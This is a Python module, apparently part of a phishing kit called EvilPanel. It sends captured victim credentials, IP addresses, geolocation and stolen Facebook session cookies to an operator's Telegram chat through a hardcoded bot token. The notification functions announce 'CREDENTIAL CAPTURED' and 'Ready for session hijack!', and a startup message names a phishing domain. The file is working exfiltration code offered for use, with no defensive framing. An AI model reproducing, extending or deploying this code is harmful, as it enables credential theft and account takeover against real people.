"""
EvilPanel Telegram Notifier
Real-time capture notifications via Telegram Bot API
"""
import os
import json
import requests
from datetime import datetime
from typing import Dict, Optional
import threading

# Telegram Configuration
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8037918547:AAGq23-FlAbxceZHMcP57hP1bNr7s3e8ubo")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8420914588")
TELEGRAM_ENABLED = os.environ.get("TELEGRAM_ENABLED", "true").lower() == "true"

# API endpoint
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"


def send_message(text: str, parse_mode: str = "Markdown") -> bool:
    """
    Send message to Telegram chat.
    
    Args:
        text: Message text (supports Markdown)
        parse_mode: "Markdown" or "HTML"
    
    Returns:
        True if sent successfully
    """
    if not TELEGRAM_ENABLED:
        return False
    
    try:
        response = requests.post(
            f"{TELEGRAM_API}/sendMessage",
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": text,
                "parse_mode": parse_mode,
                "disable_web_page_preview": True
            },
            timeout=10
        )
        return response.status_code == 200
    except Exception:
        return False


def send_async(text: str, parse_mode: str = "Markdown"):
    """Send message asynchronously (non-blocking)"""
    thread = threading.Thread(target=send_message, args=(text, parse_mode))
    thread.daemon = True
    thread.start()


def notify_credential_capture(email: str, password: str, ip: str, user_agent: str = "", 
                               geo_data: Dict = None) -> bool:
    """
    Send notification for captured credentials.
    
    Args:
        email: Captured email/username
        password: Captured password
        ip: Victim's IP address
        user_agent: Victim's user agent
        geo_data: Geolocation data dict
    """
    geo = geo_data or {}
    
    # Truncate password for notification (show first 3 chars)
    pass_preview = password[:3] + "***" if len(password) > 3 else "***"
    
    message = f"""🎯 *CREDENTIAL CAPTURED*

📧 *Email:* `{email}`
🔑 *Password:* `{pass_preview}` (full in DB)
🌐 *IP:* `{ip}`
📱 *Device:* {user_agent[:50]}...
🕐 *Time:* `{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC`

🌍 *Location:*
├ Country: {geo.get('country', 'N/A')}
├ Region: {geo.get('region', 'N/A')}
├ City: {geo.get('city', 'N/A')}
└ ISP: {geo.get('isp', 'N/A')}

⏳ *Waiting for session cookies...*"""
    
    send_async(message)
    return True


def notify_session_capture(c_user: str, xs: str, ip: str, all_cookies: Dict = None,
                           proxy_string: str = None) -> bool:
    """
    Send notification for captured session tokens.
    
    Args:
        c_user: Facebook user ID
        xs: Session token
        ip: Victim's IP
        all_cookies: All captured cookies
        proxy_string: Generated geo-matched proxy
    """
    cookies = all_cookies or {}
    
    message = f"""🍪 *SESSION CAPTURED*

👤 *User ID:* `{c_user}`
🔐 *Session (xs):* `{xs[:20]}...`
🌐 *IP:* `{ip}`
🕐 *Time:* `{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC`

🍪 *All Tokens:*
├ c\\_user: `{cookies.get('c_user', 'N/A')}`
├ xs: `{xs[:15]}...`
├ datr: `{cookies.get('datr', 'N/A')[:15] if cookies.get('datr') else 'N/A'}...`
├ fr: `{cookies.get('fr', 'N/A')[:15] if cookies.get('fr') else 'N/A'}...`
└ sb: `{cookies.get('sb', 'N/A')[:15] if cookies.get('sb') else 'N/A'}...`

🌍 *Geo-Proxy:*
`{proxy_string[:60] if proxy_string else 'Not generated'}...`

✅ *Ready for session hijack!*"""
    
    send_async(message)
    return True


def notify_error(error_type: str, details: str) -> bool:
    """Send error notification"""
    message = f"""⚠️ *ERROR*

❌ *Type:* {error_type}
📝 *Details:* {details[:200]}
🕐 *Time:* `{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC`"""
    
    send_async(message)
    return True


def notify_startup():
    """Send startup notification"""
    message = f"""🚀 *EVILPANEL STARTED*

✅ Service: Online
🌐 Domain: `{os.environ.get('EVILPANEL_DOMAIN', 'frontnews.site')}`
🕐 Time: `{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC`

Ready to capture sessions."""
    
    send_async(message)
    return True


def test_connection() -> bool:
    """Test Telegram bot connection"""
    try:
        response = requests.get(f"{TELEGRAM_API}/getMe", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get("ok"):
                bot_name = data["result"].get("username", "Unknown")
                print(f"[Telegram] Connected to bot: @{bot_name}")
                return True
        return False
    except Exception as e:
        print(f"[Telegram] Connection failed: {e}")
        return False


# Test on import (optional)
if __name__ == "__main__":
    print("Testing Telegram connection...")
    if test_connection():
        print("✅ Connection OK")
        send_message("🔧 *Test Message*\n\nEvilPanel Telegram integration working!")
    else:
        print("❌ Connection failed")
